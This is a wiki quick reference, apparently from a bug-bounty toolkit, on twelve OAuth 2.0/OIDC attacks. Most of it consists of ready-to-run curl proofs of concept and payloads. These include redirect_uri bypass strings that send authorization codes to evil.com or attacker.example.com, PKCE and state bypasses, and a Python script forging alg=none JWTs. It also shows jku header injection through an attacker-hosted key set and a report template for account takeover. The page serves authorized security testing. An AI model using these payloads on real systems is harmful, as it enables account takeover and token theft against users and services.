---
type: wiki
category: attack
tool: oauth,oidc
status: active
last-updated: 2026-04-21
---

# OAuth 2.0 / OIDC Attack Chain Quick Reference

> **Purpose:** OAuth / OIDC is the mainstream approach for modern SSO, and a broken implementation directly equals ATO. This page collects 12 attack categories + curl PoCs + severity judgments.
> Pairs with bbflow hunters: `open-redirect`, `js-secrets`, `mcp-oauth-scope`, `jwt`.

## First, understand the OAuth flow

```
1. Client sends /authorize?response_type=code&client_id=X&redirect_uri=Y&state=S&scope=...
2. User logs in + consents
3. Authorization Server responds 302 → redirect_uri?code=AAA&state=S
4. Client's /token exchanges code + client_secret for access_token
5. Client uses access_token against the resource server
```

## 12 attack categories

| # | Attack | Precondition | Severity |
|---|------|------|-------|
| 1 | Arbitrary `redirect_uri` → code theft | Lax validation | P1 ATO |
| 2 | `redirect_uri` substring-validation bypass | Client-side validation | P1 ATO |
| 3 | Open redirect on `redirect_uri` host | A separate CVE | P2 |
| 4 | Missing `state` → CSRF login | `state` not validated | P3 |
| 5 | PKCE bypass (server doesn't verify verifier) | Public client | P2 |
| 6 | Scope escalation (token gains scope not covered by consent) | Backend bug | P3-P2 |
| 7 | client_secret hardcoded in SPA | Public asset downloadable | P2-P3 |
| 8 | Authorization code reusable | Backend doesn't mark code as used | P2 |
| 9 | `response_type` can be switched to `token` (implicit) | Flow not restricted | P2 |
| 10 | JWT `alg=none` / weak HS256 | access_token is a JWT | P1 |
| 11 | `jku`/`x5u` header injection | RS256 token | P1 |
| 12 | MCP OAuth scope mismatch (write-level tool not declared in consent) | MCP server | P3 |

## 1. Arbitrary redirect_uri validation

### Detection

```bash
# Original authorize request
curl -sI "https://auth.target.com/oauth/authorize?response_type=code&client_id=abc&redirect_uri=https://app.target.com/callback&state=xxx"

# Change to an arbitrary domain
curl -sI "https://auth.target.com/oauth/authorize?response_type=code&client_id=abc&redirect_uri=https://evil.com/steal&state=xxx"

# Check the Location header:
# ✅ returns error=invalid_redirect_uri → safe
# 🔴 returns 302 → https://evil.com/steal?code=... → ATO
```

### Manual PoC

```bash
# Phishing URL (when the victim clicks it, the code gets sent to the attacker)
echo "https://auth.target.com/oauth/authorize?response_type=code&client_id=abc&redirect_uri=https://evil.com/steal&state=xxx&scope=openid+email"

# Attacker's server receives the code
curl 'https://evil.com/steal?code=AUTHCODE'

# Exchange for a token (if PKCE is off or code_verifier leaked)
curl -X POST https://auth.target.com/oauth/token \
  -d "grant_type=authorization_code" \
  -d "code=AUTHCODE" \
  -d "client_id=abc" \
  -d "redirect_uri=https://evil.com/steal"
```

## 2. redirect_uri substring / prefix validation bypass

Common bug: the client only checks `startsWith('https://app.target.com')` or `includes('target.com')`.

```bash
# Prefix bypass (subdomain attack)
https://auth.target.com/authorize?redirect_uri=https://app.target.com.evil.com/callback

# Path traversal
https://auth.target.com/authorize?redirect_uri=https://app.target.com/../evil/callback

# Query string injection
https://auth.target.com/authorize?redirect_uri=https://evil.com/?app.target.com

# Hash fragment
https://auth.target.com/authorize?redirect_uri=https://evil.com/#@app.target.com/

# Unicode normalization
https://auth.target.com/authorize?redirect_uri=https://app.target.com%EF%BC%8Eevil.com/

# Userinfo
https://auth.target.com/authorize?redirect_uri=https://app.target.com@evil.com/

# Double URL encoding
redirect_uri=https%253A%252F%252Fevil.com
```

## 3. Open redirect on the redirect_uri host

If `https://app.target.com/callback?next=/home` has an open redirect, the OAuth code can be forwarded onward:

```
1. Attacker sends: https://auth.target.com/authorize?redirect_uri=https://app.target.com/callback?next=https://evil.com
2. Victim logs in → Authorization server responds https://app.target.com/callback?code=AAA&next=https://evil.com
3. app.target.com's callback handler finishes and redirects via next → the code lands at evil.com
```

Testing:

```bash
# First find the callback's next/return_url param
curl -I 'https://app.target.com/callback?next=https://evil.com'
# Location: https://evil.com → open redirect exists → chainable
```

## 4. State CSRF

```bash
# Without state
curl -sI "https://auth.target.com/authorize?response_type=code&client_id=abc&redirect_uri=https://app/callback"

# With a fake state
curl -sI "https://auth.target.com/authorize?...&state=attacker_crafted"

# Feed the obtained code + attacker's state back into the victim:
# https://app.target.com/callback?code=ATTACKER_CODE&state=attacker_crafted
# → links the attacker's account into the victim's session → attacker can read the victim's subsequent activity
```

Judgment: after login, the code the attacker sent back gets stored into the session → account-link CSRF.

## 5. PKCE bypass

Public clients (SPA, mobile app) **must** use PKCE. If the backend doesn't verify `code_verifier`:

```bash
# 1. Victim's browser sends /authorize with code_challenge=HASH1
#    https://auth/authorize?...&code_challenge=HASH1&code_challenge_method=S256

# 2. Attacker intercepts the code (e.g. via open redirect / XSS)

# 3. Attacker exchanges the token using their own code_verifier
curl -X POST https://auth.target.com/oauth/token \
  -d "grant_type=authorization_code" \
  -d "code=STOLEN_CODE" \
  -d "client_id=abc" \
  -d "redirect_uri=https://app/callback" \
  -d "code_verifier=ATTACKER_VERIFIER"

# If access_token comes back → PKCE isn't being verified (or S256 is broken) → P2-P1
```

## 6. Scope escalation

```bash
# Originally only consented to read:user
curl -X POST https://auth.target.com/oauth/authorize \
  -d "response_type=code" \
  -d "client_id=abc" \
  -d "scope=read:user admin:all" \    # sneak in an admin scope
  -d "redirect_uri=..."

# If the consent screen never shows admin:all but the final token has it → scope escalation
# Verification: try the token against a sensitive endpoint
curl https://api.target.com/admin/users -H "Authorization: Bearer $TOKEN"
```

MCP OAuth variant (caught by the `mcp-oauth` hunter):

```bash
# Check scopes_supported from discovery
curl https://mcp.target.com/.well-known/oauth-authorization-server | jq .scopes_supported
# ['read', 'write', 'view_articles', 'create_articles', 'delete_articles']

# A user whose consent only ever showed view_articles → but the token can still call create_articles
curl -X POST https://mcp.target.com/mcp \
  -H "Authorization: Bearer $MCP_TOKEN" \
  -d '{"jsonrpc":"2.0","method":"tools/call","params":{"name":"create_article","arguments":{"title":"test"}}}'
# If HTTP 200 → scope mismatch P3
```

## 7. Hardcoded client_secret

An SPA / mobile app should never contain a client_secret (it should use a public client + PKCE instead). Common misuse:

```bash
# bbflow
bbflow hunt target.com --only js-secrets

# Manual grep
curl -s https://app.target.com/main.abc123.js | \
  grep -oE '"client_secret":"[A-Za-z0-9]{20,}"'

# Verify the secret is valid
curl -X POST https://auth.target.com/oauth/token \
  -d "grant_type=client_credentials" \
  -d "client_id=abc" \
  -d "client_secret=LEAKED_SECRET"
# If access_token comes back → confirmed P2-P3
```

## 8. Auth code reuse

```bash
# First exchange (succeeds)
curl -X POST https://auth/token -d "code=XXX&..."
# {"access_token":"...","refresh_token":"..."}

# Second exchange with the same code (should fail)
curl -X POST https://auth/token -d "code=XXX&..."
# ✅ returns invalid_grant → safe
# 🔴 returns access_token again → code is reusable P2
```

## 9. response_type switched to token (implicit flow)

Modern OAuth shouldn't enable implicit flow. But if the backend allows it:

```bash
# Switch code → token (implicit)
https://auth.target.com/authorize?response_type=token&client_id=abc&redirect_uri=...

# If 302 → https://app/callback#access_token=... → implicit flow is enabled
# implicit flow itself carries the same requirement that redirect_uri be validated perfectly
```

## 10. JWT access_token attacks

If access_token is a JWT (common in OIDC):

```bash
# decode
TOKEN="eyJhbG..."
echo "$TOKEN" | cut -d. -f1 | base64 -d
echo "$TOKEN" | cut -d. -f2 | base64 -d

# alg=none
curl https://api.target.com/me \
  -H "Authorization: Bearer $(python3 -c '
import base64, json
h={"alg":"none","typ":"JWT"}
p={"sub":"1","role":"admin","exp":9999999999}
def b64(x): return base64.urlsafe_b64encode(json.dumps(x).encode()).decode().rstrip("=")
print(f"{b64(h)}.{b64(p)}.")
')"

# If HTTP 200 → P1 total auth bypass
```

For more, see `wiki/24-tool-nuclei.md` § JWT and `wiki/41` JWT section.

## 11. jku/x5u injection

```bash
# Inspect the header
echo "$TOKEN" | cut -d. -f1 | base64 -d
# {"alg":"RS256","jku":"https://target.com/.well-known/jwks.json"}

# Change jku to point at the attacker
PAYLOAD=$(python3 << 'EOF'
import base64, json, jwt
priv = open('attacker_rsa.pem').read()
h = {"alg":"RS256","jku":"https://evil.com/jwks.json","typ":"JWT"}
p = {"sub":"admin","exp":9999999999}
print(jwt.encode(p, priv, algorithm="RS256", headers=h))
EOF
)

# Attacker hosts their own public key at https://evil.com/jwks.json
# If the target fetches jku to verify → uses the attacker's key → any token is accepted
curl https://api.target.com/admin -H "Authorization: Bearer $PAYLOAD"
```

## 12. MCP OAuth scope mismatch

See §6 — the `mcp-oauth` hunter already automates this. Manual verification:

```bash
# 1. Record the consent screen text (screenshot)
# 2. Fetch OAuth scopes_supported
# 3. Complete the flow to obtain a token
# 4. Call tools/list with the token
# 5. Compare: a tool name containing create/update/delete/write/execute that consent never mentioned → P3
```

## bbflow integration

| Corresponding hunter | Covers |
|------------|---------|
| `open-redirect` | §1 §2 §3 (20 redirect_uri bypass variants) |
| `js-secrets` | §7 hardcoded client_secret |
| `jwt` | §10 §11 JWT attacks |
| `mcp-oauth` | §12 MCP OAuth scope mismatch |

```bash
bbflow hunt target.com --only open-redirect,js-secrets,jwt,mcp-oauth
```

## Report template

```markdown
## Vulnerability Summary
https://auth.target.com/oauth/authorize has an arbitrary redirect_uri validation flaw → OAuth code theft → Account Takeover.

## Reproduction Steps

### Step 1: Confirm redirect_uri isn't validated
curl -sI "https://auth.target.com/oauth/authorize?\
response_type=code&\
client_id=abc&\
redirect_uri=https://attacker.example.com/&\
state=xxx"
# HTTP/1.1 302 Found
# Location: https://auth.target.com/login?continue=...&redirect_uri=https://attacker.example.com/

### Step 2: After the victim logs in, the code is sent to the attacker
# (screenshot of the browser's 302 chain)

### Step 3: Exchange for access_token
curl -X POST https://auth.target.com/oauth/token \
  -d "grant_type=authorization_code&code=STOLEN_CODE&client_id=abc&redirect_uri=https://attacker.example.com/"
# HTTP 200 {"access_token":"..."}

### Step 4: Use the token to act as the victim
curl https://api.target.com/user \
  -H "Authorization: Bearer $TOKEN"
# {"username":"victim","email":"victim@target.com"}

## Impact
- Account Takeover (any victim who clicks the phishing link gets taken over)
- Verified via: curl HTTP 302 chain + `/user` endpoint returns victim data

## Severity
P1 (ATO)
```

## Related files

- [14-waf-bypass-commands.md](14-waf-bypass-commands.md)
- [15-nuclei-attack-templates.md](15-nuclei-attack-templates.md) § Open redirect
- [24-tool-nuclei.md](24-tool-nuclei.md) § JWT
- [../hunters/hunt-open-redirect.sh](../hunters/hunt-open-redirect.sh)
- [../hunters/hunt-mcp-oauth-scope.sh](../hunters/hunt-mcp-oauth-scope.sh)
- RFC 6749 OAuth 2.0 / RFC 7636 PKCE / RFC 8414 Authorization Server Metadata
